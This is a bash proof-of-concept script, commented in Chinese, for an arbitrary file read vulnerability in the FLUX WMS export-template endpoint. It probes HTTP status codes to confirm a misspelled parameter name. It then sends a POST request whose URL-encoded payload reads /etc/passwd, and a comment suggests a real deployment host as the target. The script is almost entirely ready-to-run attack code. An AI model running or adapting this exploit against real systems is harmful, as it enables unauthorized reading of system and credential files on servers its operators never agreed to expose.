#!/bin/bash
# FLUX WMS 任意文件读取（GetExportTemplateServlet）POC + 参数名 oracle
# 关键坑：形参名是拼错的 dowmLoadUrl（d-o-w-m），不是 downloadUrl。
# 用 44 个「合理」名字都撞不上，就是因为没人会去猜一个拼错的词。

# ---- 参数检查 ----
if [ $# -lt 1 ]; then printf '用法: ./poc.sh <HOST>   e.g. wms.example.com\n' >&2; exit 1; fi
HOST="$1"      # 例：wms-khc.flux.com.cn
U="https://$HOST/expcenter/getExportTemplateFileAction"

echo "== [oracle 1] 参数名精确性：无参应 500，带 dowmLoadUrl 应 404 =="
curl -sk --max-time 20 -o /dev/null -w '  no-param        -> %{http_code}\n' "$U"
sleep 1.5
curl -sk --max-time 20 -o /dev/null -w '  dowmLoadUrl=x   -> %{http_code}\n' "$U?dowmLoadUrl=x"
sleep 1.5
curl -sk --max-time 20 -o /dev/null -w '  downloadUrl=abc -> %{http_code}  (正确拼写，应当仍是 500)\n' "$U?downloadUrl=abc"
sleep 1.5

echo "== [oracle 2] 是否真进 servlet：fileName=%zz 令 URLDecoder 抛异常 =="
curl -sk --max-time 20 -o /dev/null -w '  dowmLoadUrl=x&fileName=%%zz -> %{http_code}  (500 = 已进入 handlePostRequest)\n' "$U?dowmLoadUrl=x&fileName=%zz"
sleep 1.5

echo "== [PoC] 原报文（Content-Length 应等于 55）=="
curl -sk -X POST "$U" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: https://$HOST/" \
  --data-raw 'dowmLoadUrl=%2f%65%74%63%2f%70%61%73%73%77%64&fileName=' -i | head -30

# 成功判据：HTTP 200 + Content-Type: application/force-download + 响应体为文件内容
# 失败形态：
#   200/404 但 body 是 {"timestamp":...,"status":404,...,"path":"/expcenter/getExportTemplateFileAction"}
#   => formatFilePaht 路径校验（该部署已修复）或文件不存在，不是参数名问题
#   500 => 参数缺失（dowmLoadUrl 或 fileName 未提供），handler 抛 NPE
